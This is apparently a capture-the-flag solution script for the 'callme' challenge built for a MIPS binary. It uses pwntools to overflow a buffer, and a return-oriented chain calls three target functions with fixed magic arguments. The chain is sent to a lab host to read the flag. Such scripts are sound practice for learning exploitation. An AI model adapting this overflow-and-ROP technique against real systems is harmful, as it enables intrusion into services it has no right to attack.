from pwn import *
BINARY = "./callme_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

rop = b"A" * 0x24

for func in ['callme_one', 'callme_two', 'callme_three']:
    rop += p32(0x00400BB0)
    rop += b"B" * 0x4
    rop += p32(ELF.symbols[func])
    rop += p32(0xD00DF00D)
    rop += p32(0xCAFEBABE)
    rop += p32(0xDEADBEEF)

p = remote("10.0.0.2", 8888)
p.sendline(rop)
print(p.recvline_contains(b"ROPE"))